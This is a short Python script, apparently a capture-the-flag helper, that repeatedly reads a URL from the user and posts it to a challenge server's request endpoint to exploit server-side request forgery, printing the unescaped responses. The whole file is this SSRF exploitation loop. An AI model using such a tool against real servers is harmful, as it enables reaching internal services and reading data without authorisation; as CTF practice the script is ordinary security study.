import html
import readline

import requests

URL = "http://web.zh3r0.cf:6969/request"

while True:
    ssrf_url = input("url: ")
    res = requests.post(URL, data={"url": ssrf_url, "sub": "sub"})

    json = html.unescape(res.text.split("</form>")[1].split("<br>")[0].strip())
    print(json)
